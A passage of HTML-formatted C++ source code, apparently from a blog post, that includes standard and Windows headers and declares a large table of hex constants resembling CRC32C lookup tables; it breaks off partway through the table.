class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> t1[<span class="number">2048</span>] = &#123;</span><br><span class="line"><span class="number">0x00000000</span>, <span class="number">0xF26B8303</span>, <span class="number">0xE13B70F7</span>, <span class="number">0x1350F3F4</span>, <span class="number">0xC79A971F</span>, <span class="number">0x35F1141C</span>, <span class="number">0x26A1E7E8</span>, <span class="number">0xD4CA64EB</span>,</span><br><span class="line"><span class="number">0x8AD958CF</span>, <span class="number">0x78B2DBCC</span>, <span class="number">0x6BE22838</span>, <span class="number">0x9989AB3B</span>, <span class="number">0x4D43CFD0</span>, <span class="number">0xBF284CD3</span>, <span class="number">0xAC78BF27</span>, <span class="number">0x5E133C24</span>,</span><br><span class="line"><span class="number">0x105EC76F</span>, <span class="number">0xE235446C</span>, <span class="number">0xF165B798</span>, <span class="number">0x030E349B</span>, <span class="number">0xD7C45070</span>, <span class="number">0x25AFD373</span>, <span class="number">0x36FF2087</span>, <span class="number">0xC494A384</span>,</span><br><span class="line"><span class="number">0x9A879FA0</span>, <span class="number">0x68EC1CA3</span>, <span class="number">0x7BBCEF57</span>, <span class="number">0x89D76C54</span>, <span class="number">0x5D1D08BF</span>, <span class="number">0xAF768BBC</span>, <span class="number">0xBC267848</span>, <span class="number">0x4E4DFB4B</span>,</span><br><span class="line"><span class="number">0x20BD8EDE</span>, <span class="number">0xD2D60DDD</span>, <span class="number">0xC186FE29</span>, <span class="number">0x33ED7D2A</span>, <span class="number">0xE72719C1</span>, <span class="number">0x154C9AC2</span>, <span class="number">0x061C6936</span>, <span class="number">0xF477EA35</span>,</span><br><span class="line"><span class="number">0xAA64D611</span>, <span class="number">0x580F5512</span>, <span class="number">0x4B5FA6E6</span>, <span class="number">0xB93425E5</span>, <span class="number">0x6DFE410E</span>, <span class="number">0x9F95C20D</span>, <span class="number">0x8CC531F9</span>, <span class="number">0x7EAEB2FA</span>,</span><br><span class="line"><span class="number">0x30E349B1</span>, <span class="number">0xC288CAB2</span>, <span class="number">0xD1D83946</span>, <span class="number">0x23B3BA45</span>, <span class="number">0xF779DEAE</span>, <span class="number">0x05125DAD</span>, <span class="number">0x1642AE59</span>, <span class="number">0xE4292D5A</span>,</span><br><span class="line"><span class="number">0xBA3A117E</span>, <span class="number">0x4851927D</span>, <span class="number">0x5B016189</span>, <span class="number">0xA96AE28A</span>, <span class="number">0x7DA08661</span>, <span class="number">0x8FCB0562</span>, <span class="number">0x9C9BF696</span>, <span class="number">0x6EF07595</span>,</span><br><span class="line"><span class="number">0x417B1DBC</span>, <span class="number">0xB3109EBF</span>, <span class="number">0xA0406D4B</span>, <span class="number">0x522BEE48</span>, <span class="number">0x86E18AA3</span>, <span class="number">0x748A09A0</span>, <span class="number">0x67DAFA54</span>, <span class="number">0x95B17957</span>,</span><br><span class="line"><span class="number">0xCBA24573</span>, <span class="number">0x39C9C670</span>, <span class="number">0x2A993584</span>, <span class="number">0xD8F2B687</span>, <span class="number">0x0C38D26C</span>, <span class="number">0xFE53516F</span>, <span class="number">0xED03A29B</span>, <span class="number">0x1F682198</span>,</span><br><span class="line"><span class="number">0x5125DAD3</span>, <span class="number">0xA34E59D0</span>, <span class="number">0xB01EAA24</span>, <span class="number">0x42752927</span>, <span class="number">0x96BF4DCC</span>, <span class="number">0x64D4CECF</span>, <span class="number">0x77843D3B</span>, <span class="number">0x85EFBE38</span>,</span><br><span class="line"><span class="number">0xDBFC821C</span>, <span class="number">0x2997011F</span>, <span class="number">0x3AC7F2EB</span>, <span class="number">0xC8AC71E8</span>, <span class="number">0x1C661503</span>, <span class="number">0xEE0D9600</span>, <span class="number">0xFD5D65F4</span>, <span class="number">0x0F36E6F7</span>,</span><br><span class="line"><span class="number">0x61C69362</span>, <span class="number">0x93AD1061</span>, <span class="number">0x80FDE395</span>, <span class="number">0x72966096</span>, <span class="number">0xA65C047D</span>, <span class="number">0x5437877E</span>, <span class="number">0x4767748A</span>, <span class="number">0xB50CF789</span>,</span><br><span class="line"><span class="number">0xEB1FCBAD</span>, <span class="number">0x197448AE</span>, <span class="number">0x0A24BB5A</span>, <span class="number">0xF84F3859</span>, <span class="number">0x2C855CB2</span>, <span class="number">0xDEEEDFB1</span>, <span class="number">0xCDBE2C45</span>, <span class="number">0x3FD5AF46</span>,</span><br><span class="line"><span class="number">0x7198540D</span>, <span class="number">0x83F3D70E</span>, <span class="number">0x90A324FA</span>, <span class="number">0x62C8A7F9</span>, <span class="number">0xB602C312</span>, <span class="number">0x44694011</span>, <span class="number">0x5739B3E5</span>, <span class="number">0xA55230E6</span>,</span><br><span class="line"><span class="number">0xFB410CC2</span>, <span class="number">0x092A8FC1</span>, <span class="number">0x1A7A7C35</span>, <span class="number">0xE811FF36</span>, <span class="number">0x3CDB9BDD</span>, <span class="number">0xCEB018DE</span>, <span class="number">0xDDE0EB2A</span>, <span class="number">0x2F8B6829</span>,</span><br><span class="line"><span class="number">0x82F63B78</span>, <span class="number">0x709DB87B</span>, <span class="number">0x63CD4B8F</span>, <span class="number">0x91A6C88C</span>, <span class="number">0x456CAC67</span>, <span class="number">0xB7072F64</span>, <span class="number">0xA457DC90</span>, <span class="number">0x563C5F93</span>,</span><br><span class="line"><span class="number">0x082F63B7</span>, <span class="number">0xFA44E0B4</span>, <span class="number">0xE9141340</span>, <span class="number">0x1B7F9043</span>, <span class="number">0xCFB5F4A8</span>, <span class="number">0x3DDE77AB</span>, <span class="number">0x2E8E845F</span>, <span class="number">0xDCE5075C</span>,</span><br><span class="line"><span class="number">0x92A8FC17</span>, <span class="number">0x60C37F14</span>, <span class="number">0x73938CE0</span>, <span class="number">0x81F80FE3</span>, <span class="number">0x55326B08</span>, <span class="number">0xA759E80B</span>, <span class="number">0xB4091BFF</span>, <span class="number">0x466298FC</span>,</span><br><span class="line"><span class="number">0x1871A4D8</span>, <span class="number">0xEA1A27DB</span>, <span class="number">0xF94AD42F</span>, <span class="number">0x0B21572C</span>, <span class="number">0xDFEB33C7</span>, <span class="number">0x2D80B0C4</span>, <span class="number">0x3ED04330</span>, <span class="number">0xCCBBC033</span>,</span><br><span class="line"><span class="number">0xA24BB5A6</span>, <span class="number">0x502036A5</span>, <span class="number">0x4370C551</span>, <span class="number">0xB11B4652</span>, <span class="number">0x65D122B9</span>, <span class="number">0x97BAA1BA</span>, <span class="number">0x84EA524E</span>, <span class="number">0x7681D14D</span>,</span><br><span class="line"><span class="number">0x2892ED69</span>, <span class="number">0xDAF96E6A</span>, <span class="number">0xC9A99D9E</span>, <span class="number">0x3BC21E9D</span>, <span class="number">0xEF087A76</span>, <span class="number">0x1D63F975</span>, <span class="number">0x0E330A81</span>, <span class="number">0xFC588982</span>,</span><br><span class="line"><span class="number">0xB21572C9</span>, <span class="number">0x407EF1CA</span>, <span class="number">0x532E023E</span>, <span class="number">0xA145813D</span>, <span class="number">0x758FE5D6</span>, <span class="number">0x87E466D5</span>, <span class="number">0x94B49521</span>, <span class="number">0x66DF1622</span>,</span><br><span class="line"><span class="number">0x38CC2A06</span>, <span class="number">0xCAA7A905</span>, <span class="number">0xD9F75AF1</span>, <span class="number">0x2B9CD9F2</span>, <span class="number">0xFF56BD19</span>, <span class="number">0x0D3D3E1A</span>, <span class="number">0x1E6DCDEE</span>, <span class="number">0xEC064EED</span>,</span><br><span class="line"><span class="number">0xC38D26C4</span>, <span class="number">0x31E6A5C7</span>, <span class="number">0x22B65633</span>, <span class="number">0xD0DDD530</span>, <span class="number">0x0417B1DB</span>, <span class="number">0xF67C32D8</span>, <span class="number">0xE52CC12C</span>, <span class="number">0x1747422F</span>,</span><br><span class="line"><span class="number">0x49547E0B</span>, <span class="number">0xBB3FFD08</span>, <span class="number">0xA86F0EFC</span>, <span class="number">0x5A048DFF</span>, <span class="number">0x8ECEE914</span>, <span class="number">0x7CA56A17</span>, <span class="number">0x6FF599E3</span>, <span class="number">0x9D9E1AE0</span>,</span><br><span class="line"><span class="number">0xD3D3E1AB</span>, <span class="number">0x21B862A8</span>, <span class="number">0x32E8915C</span>, <span class="number">0xC083125F</span>, <span class="number">0x144976B4</span>, <span class="number">0xE622F5B7</span>, <span class="number">0xF5720643</span>, <span class="number">0x07198540</span>,</span><br><span class="line"><span class="number">0x590AB964</span>, <span class="number">0xAB613A67</span>, <span class="number">0xB831C993</span>, <span class="number">0x4A5A4A90</span>, <span class="number">0x9E902E7B</span>, <span class="number">0x6CFBAD78</span>, <span class="number">0x7FAB5E8C</span>, <span class="number">0x8DC0DD8F</span>,</span><br><span class="line"><span class="number">0xE330A81A</span>, <span class="number">0x115B2B19</span>, <span class="number">0x020BD8ED</span>, <span class="number">0xF0605BEE</span>, <span class="number">0x24AA3F05</span>, <span class="number">0xD6C1BC06</span>, <span class="number">0xC5914FF2</span>, <span class="number">0x37FACCF1</span>,</span><br><span class="line"><span class="number">0x69E9F0D5</span>, <span class="number">0x9B8273D6</span>, <span class="number">0x88D28022</span>, <span class="number">0x7AB90321</span>, <span class="number">0xAE7367CA</span>, <span class="number">0x5C18E4C9</span>, <span class="number">0x4F48173D</span>, <span class="number">0xBD23943E</span>,</span><br><span class="line"><span class="number">0xF36E6F75</span>, <span class="number">0x0105EC76</span>, <span class="number">0x12551F82</span>, <span class="number">0xE03E9C81</span>, <span class="number">0x34F4F86A</span>, <span class="number">0xC69F7B69</span>, <span class="number">0xD5CF889D</span>, <span class="number">0x27A40B9E</span>,</span><br><span class="line"><span class="number">0x79B737BA</span>, <span class="number">0x8BDCB4B9</span>, <span class="number">0x988C474D</span>, <span class="number">0x6AE7C44E</span>, <span class="number">0xBE2DA0A5</span>, <span class="number">0x4C4623A6</span>, <span class="number">0x5F16D052</span>, <span class="number">0xAD7D5351</span>,</span><br><span class="line"><span class="number">0x00000000</span>, <span class="number">0x13A29877</span>, <span class="number">0x274530EE</span>, <span class="number">0x34E7A899</span>, <span class="number">0x4E8A61DC</span>, <span class="number">0x5D28F9AB</span>, <span class="number">0x69CF5132</span>, <span class="number">0x7A6DC945</span>,</span><br><span class="line"><span class="number">0x9D14C3B8</span>, <span class="number">0x8EB65BCF</span>, <span class="number">0xBA51F356</span>, <span class="number">0xA9F36B21</span>, <span class="number">0xD39EA264</span>, <span class="number">0xC03C3A13</span>, <span class="number">0xF4DB928A</span>, <span class="number">0xE7790AFD</span>,</span><br><span class="line"><span class="number">0x3FC5F181</span>, <span class="number">0x2C6769F6</span>, <span class="number">0x1880C16F</span>, <span class="number">0x0B225918</span>, <span class="number">0x714F905D</span>, <span class="number">0x62ED082A</span>, <span class="number">0x560AA0B3</span>, <span class="number">0x45A838C4</span>,</span><br><span class="line"><span class="number">0xA2D13239</span>, <span class="number">0xB173AA4E</span>, <span class="number">0x859402D7</span>, <span class="number">0x96369AA0</span>, <span class="number">0xEC5B53E5</span>, <span class="number">0xFFF9CB92</span>, <span class="number">0xCB1E630B</span>, <span class="number">0xD8BCFB7C</span>,</span><br><span class="line"><span class="number">0x7F8BE302</span>, <span class="number">0x6C297B75</span>, <span class="number">0x58CED3EC</span>, <span class="number">0x4B6C4B9B</span>, <span class="number">0x310182DE</span>, <span class="number">0x22A31AA9</span>, <span class="number">0x1644B230</span>, <span class="number">0x05E62A47</span>,</span><br><span class="line"><span class="number">0xE29F20BA</span>, <span class="number">0xF13DB8CD</span>, <span class="number">0xC5DA1054</span>, <span class="number">0xD6788823</span>, <span class="number">0xAC154166</span>, <span class="number">0xBFB7D911</span>, <span class="number">0x8B507188</span>, <span class="number">0x98F2E9FF</span>,</span><br><span class="line"><span class="number">0x404E1283</span>, <span class="number">0x53EC8AF4</span>, <span class="number">0x670B226D</span>, <span class="number">0x74A9BA1A</span>, <span class="number">0x0EC4735F</span>, <span class="number">0x1D66EB28</span>, <span class="number">0x298143B1</span>, <span class="number">0x3A23DBC6</span>,</span><br><span class="line"><span class="number">0xDD5AD13B</span>, <span class="number">0xCEF8494C</span>, <span class="number">0xFA1FE1D5</span>, <span class="number">0xE9BD79A2</span>, <span class="number">0x93D0B0E7</span>, <span class="number">0x80722890</span>, <span class="number">0xB4958009</span>, <span class="number">0xA737187E</span>,</span><br><span class="line"><span class="number">0xFF17C604</span>, <span class="number">0xECB55E73</span>, <span class="number">0xD852F6EA</span>, <span class="number">0xCBF06E9D</span>, <span class="number">0xB19DA7D8</span>, <span class="number">0xA23F3FAF</span>, <span class="number">0x96D89736</span>, <span class="number">0x857A0F41</span>,</span><br><span class="line"><span class="number">0x620305BC</span>, <span class="number">0x71A19DCB</span>, <span class="number">0x45463552</span>, <span class="number">0x56E4AD25</span>, <span class="number">0x2C896460</span>, <span class="number">0x3F2BFC17</span>, <span class="number">0x0BCC548E</span>, <span class="number">0x186ECCF9</span>,</span><br><span class="line"><span class="number">0xC0D23785</span>, <span class="number">0xD370AFF2</span>, <span class="number">0xE797076B</span>, <span class="number">0xF4359F1C</span>, <span class="number">0x8E585659</span>, <span class="number">0x9DFACE2E</span>, <span class="number">0xA91D66B7</span>, <span class="number">0xBABFFEC0</span>,</span><br><span class="line"><span class="number">0x5DC6F43D</span>, <span class="number">0x4E646C4A</span>, <span class="number">0x7A83C4D3</span>, <span class="number">0x69215CA4</span>, <span class="number">0x134C95E1</span>, <span class="number">0x00EE0D96</span>, <span class="number">0x3409A50F</span>, <span class="number">0x27AB3D78</span>,</span><br><span class="line"><span class="number">0x809C2506</span>, <span class="number">0x933EBD71</span>, <span class="number">0xA7D915E8</span>, <span class="number">0xB47B8D9F</span>, <span class="number">0xCE1644DA</span>, <span class="number">0xDDB4DCAD</span>, <span class="number">0xE9537434</span>, <span class="number">0xFAF1EC43</span>,</span><br><span class="line"><span class="number">0x1D88E6BE</span>, <span class="number">0x0E2A7EC9</span>, <span class="number">0x3ACDD650</span>, <span class="number">0x296F4E27</span>, <span class="number">0x53028762</span>, <span class="number">0x40A01F15</span>, <span class="number">0x7447B78C</span>, <span class="number">0x67E52FFB</span>,</span><br><span class="line"><span class="number">0xBF59D487</span>, <span class="number">0xACFB4CF0</span>, <span class="number">0x981CE469</span>, <span class="number">0x8BBE7C1E</span>, <span class="number">0xF1D3B55B</span>, <span class="number">0xE2712D2C</span>, <span class="number">0xD69685B5</span>, <span class="number">0xC5341DC2</span>,</span><br><span class="line"><span class="number">0x224D173F</span>, <span class="number">0x31EF8F48</span>, <span class="number">0x050827D1</span>, <span class="number">0x16AABFA6</span>, <span class="number">0x6CC776E3</span>, <span class="number">0x7F65EE94</span>, <span class="number">0x4B82460D</span>, <span class="number">0x5820DE7A</span>,</span><br><span class="line"><span class="number">0xFBC3FAF9</span>, <span class="number">0xE861628E</span>, <span class="number">0xDC86CA17</span>, <span class="number">0xCF245260</span>, <span class="number">0xB5499B25</span>, <span class="number">0xA6EB0352</span>, <span class="number">0x920CABCB</span>, <span class="number">0x81AE33BC</span>,</span><br><span class="line"><span class="number">0x66D73941</span>, <span class="number">0x7575A136</span>, <span class="number">0x419209AF</span>, <span class="number">0x523091D8</span>, <span class="number">0x285D589D</span>, <span class="number">0x3BFFC0EA</span>, <span class="number">0x0F186873</span>, <span class="number">0x1CBAF004</span>,</span><br><span class="line"><span class="number">0xC4060B78</span>, <span class="number">0xD7A4930F</span>, <span class="number">0xE3433B96</span>, <span class="number">0xF0E1A3E1</span>, <span class="number">0x8A8C6AA4</span>, <span class="number">0x992EF2D3</span>, <span class="number">0xADC95A4A</span>, <span class="number">0xBE6BC23D</span>,</span><br><span class="line"><span class="number">0x5912C8C0</span>, <span class="number">0x4AB050B7</span>, <span class="number">0x7E57F82E</span>, <span class="number">0x6DF56059</span>, <span class="number">0x1798A91C</span>, <span class="number">0x043A316B</span>, <span class="number">0x30DD99F2</span>, <span class="number">0x237F0185</span>,</span><br><span class="line"><span class="number">0x844819FB</span>, <span class="number">0x97EA818C</span>, <span class="number">0xA30D2915</span>, <span class="number">0xB0AFB162</span>, <span class="number">0xCAC27827</span>, <span class="number">0xD960E050</span>, <span class="number">0xED8748C9</span>, <span class="number">0xFE25D0BE</span>,</span><br><span class="line"><span class="number">0x195CDA43</span>, <span class="number">0x0AFE4234</span>, <span class="number">0x3E19EAAD</span>, <span class="number">0x2DBB72DA</span>, <span class="number">0x57D6BB9F</span>, <span class="number">0x447423E8</span>, <span class="number">0x70938B71</span>, <span class="number">0x63311306</span>,</span><br><span class="line"><span class="number">0xBB8DE87A</span>, <span class="number">0xA82F700D</span>, <span class="number">0x9CC8D894</span>, <span class="number">0x8F6A40E3</span>, <span class="number">0xF50789A6</span>, <span class="number">0xE6A511D1</span>, <span class="number">0xD242B948</span>, <span class="number">0xC1E0213F</span>,</span><br><span class="line"><span class="number">0x26992BC2</span>, <span class="number">0x353BB3B5</span>, <span class="number">0x01DC1B2C</span>, <span class="number">0x127E835B</span>, <span class="number">0x68134A1E</span>, <span class="number">0x7BB1D269</span>, <span class="number">0x4F567AF0</span>, <span class="number">0x5CF4E287</span>,</span><br><span class="line"><span class="number">0x04D43CFD</span>, <span class="number">0x1776A48A</span>, <span class="number">0x23910C13</span>, <span class="number">0x30339464</span>, <span class="number">0x4A5E5D21</span>, <span class="number">0x59FCC556</span>, <span class="number">0x6D1B6DCF</span>, <span class="number">0x7EB9F5B8</span>,</span><br><span class="line"><span class="number">0x99C0FF45</span>, <span class="number">0x8A626732</span>, <span class="number">0xBE85CFAB</span>, <span class="number">0xAD2757DC</span>, <span class="number">0xD74A9E99</span>, <span class="number">0xC4E806EE</span>, <span class="number">0xF00FAE77</span>, <span class="number">0xE3AD3600</span>,</span><br><span class="line"><span class="number">0x3B11CD7C</span>, <span class="number">0x28B3550B</span>, <span class="number">0x1C54FD92</span>, <span class="number">0x0FF665E5</span>, <span class="number">0x759BACA0</span>, <span class="number">0x663934D7</span>, <span class="number">0x52DE9C4E</span>, <span class="number">0x417C0439</span>,</span><br><span class="line"><span class="number">0xA6050EC4</span>, <span class="number">0xB5A796B3</span>, <span class="number">0x81403E2A</span>, <span class="number">0x92E2A65D</span>, <span class="number">0xE88F6F18</span>, <span class="number">0xFB2DF76F</span>, <span class="number">0xCFCA5FF6</span>, <span class="number">0xDC68C781</span>,</span><br><span class="line"><span class="number">0x7B5FDFFF</span>, <span class="number">0x68FD4788</span>, <span class="number">0x5C1AEF11</span>, <span class="number">0x4FB87766</span>, <span class="number">0x35D5BE23</span>, <span class="number">0x26772654</span>, <span class="number">0x12908ECD</span>, <span class="number">0x013216BA</span>,</span><br><span class="line"><span class="number">0xE64B1C47</span>, <span class="number">0xF5E98430</span>, <span class="number">0xC10E2CA9</span>, <span class="number">0xD2ACB4DE</span>, <span class="number">0xA8C17D9B</span>, <span class="number">0xBB63E5EC</span>, <span class="number">0x8F844D75</span>, <span class="number">0x9C26D502</span>,</span><br><span class="line"><span class="number">0x449A2E7E</span>, <span class="number">0x5738B609</span>, <span class="number">0x63DF1E90</span>, <span class="number">0x707D86E7</span>, <span class="number">0x0A104FA2</span>, <span class="number">0x19B2D7D5</span>, <span class="number">0x2D557F4C</span>, <span class="number">0x3EF7E73B</span>,</span><br><span class="line"><span class="number">0xD98EEDC6</span>, <span class="number">0xCA2C75B1</span>, <span class="number">0xFECBDD28</span>, <span class="number">0xED69455F</span>, <span class="number">0x97048C1A</span>, <span class="number">0x84A6146D</span>, <span class="number">0xB041BCF4</span>, <span class="number">0xA3E32483</span>,</span><br><span class="line"><span class="number">0x00000000</span>, <span class="number">0xA541927E</span>, <span class="number">0x4F6F520D</span>, <span class="number">0xEA2EC073</span>, <span class="number">0x9EDEA41A</span>, <span class="number">0x3B9F3664</span>, <span class="number">0xD1B1F617</span>, <span class="number">0x74F06469</span>,</span><br><span class="line"><span class="number">0x38513EC5</span>, <span class="number">0x9D10ACBB</span>, <span class="number">0x773E6CC8</span>, <span class="number">0xD27FFEB6</span>, <span class="number">0xA68F9ADF</span>, <span class="number">0x03CE08A1</span>, <span class="number">0xE9E0C8D2</span>, <span class="number">0x4CA15AAC</span>,</span><br><span class="line"><span class="number">0x70A27D8A</span>, <span class="number">0xD5E3EFF4</span>, <span class="number">0x3FCD2F87</span>, <span class="number">0x9A8CBDF9</span>, <span class="number">0xEE7CD990</span>, <span class="number">0x4B3D4BEE</span>, <span class="number">0xA1138B9D</span>, <span class="number">0x045219E3</span>,</span><br><span class="line"><span class="number">0x48F3434F</span>, <span class="number">0xEDB2D131</span>, <span class="number">0x079C1142</span>, <span class="number">0xA2DD833C</span>, <span class="number">0xD62DE755</span>, <span class="number">0x736C752B</span>, <span class="number">0x9942B558</span>, <span class="number">0x3C032726</span>,</span><br><span class="line"><span class="number">0xE144FB14</span>, <span class="number">0x4405696A</span>, <span class="number">0xAE2BA919</span>, <span class="number">0x0B6A3B67</span>, <span class="number">0x7F9A5F0E</span>, <span class="number">0xDADBCD70</span>, <span class="number">0x30F50D03</span>, <span class="number">0x95B49F7D</span>,</span><br><span class="line"><span class="number">0xD915C5D1</span>, <span class="number">0x7C5457AF</span>, <span class="number">0x967A97DC</span>, <span class="number">0x333B05A2</span>, <span class="number">0x47CB61CB</span>, <span class="number">0xE28AF3B5</span>, <span class="number">0x08A433C6</span>, <span class="number">0xADE5A1B8</span>,</span><br><span class="line"><span class="number">0x91E6869E</span>, <span class="number">0x34A714E0</span>, <span class="number">0xDE89D493</span>, <span class="number">0x7BC846ED</span>, <span class="number">0x0F382284</span>, <span class="number">0xAA79B0FA</span>, <span class="number">0x40577089</span>, <span class="number">0xE516E2F7</span>,</span><br><span class="line"><span class="number">0xA9B7B85B</span>, <span class="number">0x0CF62A25</span>, <span class="number">0xE6D8EA56</span>, <span class="number">0x43997828</span>, <span class="number">0x37691C41</span>, <span class="number">0x92288E3F</span>, <span class="number">0x78064E4C</span>, <span class="number">0xDD47DC32</span>,</span><br><span class="line"><span class="number">0xC76580D9</span>, <span class="number">0x622412A7</span>, <span class="number">0x880AD2D4</span>, <span class="number">0x2D4B40AA</span>, <span class="number">0x59BB24C3</span>, <span class="number">0xFCFAB6BD</span>, <span class="number">0x16D476CE</span>, <span class="number">0xB395E4B0</span>,</span><br><span class="line"><span class="number">0xFF34BE1C</span>, <span class="number">0x5A752C62</span>, <span class="number">0xB05BEC11</span>, <span class="number">0x151A7E6F</span>, <span class="number">0x61EA1A06</span>, <span class="number">0xC4AB8878</span>, <span class="number">0x2E85480B</span>, <span class="number">0x8BC4DA75</span>,</span><br><span class="line"><span class="number">0xB7C7FD53</span>, <span class="number">0x12866F2D</span>, <span class="number">0xF8A8AF5E</span>, <span class="number">0x5DE93D20</span>, <span class="number">0x29195949</span>, <span class="number">0x8C58CB37</span>, <span class="number">0x66760B44</span>, <span class="number">0xC337993A</span>,</span><br><span class="line"><span class="number">0x8F96C396</span>, <span class="number">0x2AD751E8</span>, <span class="number">0xC0F9919B</span>, <span class="number">0x65B803E5</span>, <span class="number">0x1148678C</span>, <span class="number">0xB409F5F2</span>, <span class="number">0x5E273581</span>, <span class="number">0xFB66A7FF</span>,</span><br><span class="line"><span class="number">0x26217BCD</span>, <span class="number">0x8360E9B3</span>, <span class="number">0x694E29C0</span>, <span class="number">0xCC0FBBBE</span>, <span class="number">0xB8FFDFD7</span>, <span class="number">0x1DBE4DA9</span>, <span class="number">0xF7908DDA</span>, <span class="number">0x52D11FA4</span>,</span><br><span class="line"><span class="number">0x1E704508</span>, <span class="number">0xBB31D776</span>, <span class="number">0x511F1705</span>, <span class="number">0xF45E857B</span>, <span class="number">0x80AEE112</span>, <span class="number">0x25EF736C</span>, <span class="number">0xCFC1B31F</span>, <span class="number">0x6A802161</span>,</span><br><span class="line"><span class="number">0x56830647</span>, <span class="number">0xF3C29439</span>, <span class="number">0x19EC544A</span>, <span class="number">0xBCADC634</span>, <span class="number">0xC85DA25D</span>, <span class="number">0x6D1C3023</span>, <span class="number">0x8732F050</span>, <span class="number">0x2273622E</span>,</span><br><span class="line"><span class="number">0x6ED23882</span>, <span class="number">0xCB93AAFC</span>, <span class="number">0x21BD6A8F</span>, <span class="number">0x84FCF8F1</span>, <span class="number">0xF00C9C98</span>, <span class="number">0x554D0EE6</span>, <span class="number">0xBF63CE95</span>, <span class="number">0x1A225CEB</span>,</span><br><span class="line"><span class="number">0x8B277743</span>, <span class="number">0x2E66E53D</span>, <span class="number">0xC448254E</span>, <span class="number">0x6109B730</span>, <span class="number">0x15F9D359</span>, <span class="number">0xB0B84127</span>, <span class="number">0x5A968154</span>, <span class="number">0xFFD7132A</span>,</span><br><span class="line"><span class="number">0xB3764986</span>, <span class="number">0x1637DBF8</span>, <span class="number">0xFC191B8B</span>, <span class="number">0x595889F5</span>, <span class="number">0x2DA8ED9C</span>, <span class="number">0x88E97FE2</span>, <span class="number">0x62C7BF91</span>, <span class="number">0xC7862DEF</span>,</span><br><span class="line"><span class="number">0xFB850AC9</span>, <span class="number">0x5EC498B7</span>, <span class="number">0xB4EA58C4</span>, <span class="number">0x11ABCABA</span>, <span class="number">0x655BAED3</span>, <span class="number">0xC01A3CAD</span>, <span class="number">0x2A34FCDE</span>, <span class="number">0x8F756EA0</span>,</span><br><span class="line"><span class="number">0xC3D4340C</span>, <span class="number">0x6695A672</span>, <span class="number">0x8CBB6601</span>, <span class="number">0x29FAF47F</span>, <span class="number">0x5D0A9016</span>, <span class="number">0xF84B0268</span>, <span class="number">0x1265C21B</span>, <span class="number">0xB7245065</span>,</span><br><span class="line"><span class="number">0x6A638C57</span>, <span class="number">0xCF221E29</span>, <span class="number">0x250CDE5A</span>, <span class="number">0x804D4C24</span>, <span class="number">0xF4BD284D</span>, <span class="number">0x51FCBA33</span>, <span class="number">0xBBD27A40</span>, <span class="number">0x1E93E83E</span>,</span><br><span class="line"><span class="number">0x5232B292</span>, <span class="number">0xF77320EC</span>, <span class="number">0x1D5DE09F</span>, <span class="number">0xB81C72E1</span>, <span class="number">0xCCEC1688</span>, <span class="number">0x69AD84F6</span>, <span class="number">0x83834485</span>, <span class="number">0x26C2D6FB</span>,</span><br><span class="line"><span class="number">0x1AC1F1DD</span>, <span class="number">0xBF8063A3</span>, <span class="number">0x55AEA3D0</span>, <span class="number">0xF0EF31AE</span>, <span class="number">0x841F55C7</span>, <span class="number">0x215EC7B9</span>, <span class="number">0xCB7007CA</span>, <span class="number">0x6E3195B4</span>,</span><br><span class="line"><span class="number">0x2290CF18</span>, <span class="number">0x87D15D66</span>, <span class="number">0x6DFF9D15</span>, <span class="number">0xC8BE0F6B</span>, <span class="number">0xBC4E6B02</span>, <span class="number">0x190FF97C</span>, <span class="number">0xF321390F</span>, <span class="number">0x5660AB71</span>,</span><br><span class="line"><span class="number">0x4C42F79A</span>, <span class="number">0xE90365E4</span>, <span class="number">0x032DA597</span>, <span class="number">0xA66C37E9</span>, <span class="number">0xD29C5380</span>, <span class="number">0x77DDC1FE</span>, <span class="number">0x9DF3018D</span>, <span class="number">0x38B293F3</span>,</span><br><span class="line"><span class="number">0x7413C95F</span>, <span class="number">0xD1525B21</span>, <span class="number">0x3B7C9B52</span>, <span class="number">0x9E3D092C</span>, <span class="number">0xEACD6D45</span>, <span class="number">0x4F8CFF3B</span>, <span class="number">0xA5A23F48</span>, <span class="number">0x00E3AD36</span>,</span><br><span class="line"><span class="number">0x3CE08A10</span>, <span class="number">0x99A1186E</span>, <span class="number">0x738FD81D</span>, <span class="number">0xD6CE4A63</span>, <span class="number">0xA23E2E0A</span>, <span class="number">0x077FBC74</span>, <span class="number">0xED517C07</span>, <span class="number">0x4810EE79</span>,</span><br><span class="line"><span class="number">0x04B1B4D5</span>, <span class="number">0xA1F026AB</span>, <span class="number">0x4BDEE6D8</span>, <span class="number">0xEE9F74A6</span>, <span class="number">0x9A6F10CF</span>, <span class="number">0x3F2E82B1</span>, <span class="number">0xD50042C2</span>, <span class="number">0x7041D0BC</span>,</span><br><span class="line"><span class="number">0xAD060C8E</span>, <span class="number">0x08479EF0</span>, <span class="number">0xE2695E83</span>, <span class="number">0x4728CCFD</span>, <span class="number">0x33D8A894</span>, <span class="number">0x96993AEA</span>, <span class="number">0x7CB7FA99</span>, <span class="number">0xD9F668E7</span>,</span><br><span class="line"><span class="number">0x9557324B</span>, <span class="number">0x3016A035</span>, <span class="number">0xDA386046</span>, <span class="number">0x7F79F238</span>, <span class="number">0x0B899651</span>, <span class="number">0xAEC8042F</span>, <span class="number">0x44E6C45C</span>, <span class="number">0xE1A75622</span>,</span><br><span class="line"><span class="number">0xDDA47104</span>, <span class="number">0x78E5E37A</span>, <span class="number">0x92CB2309</span>, <span 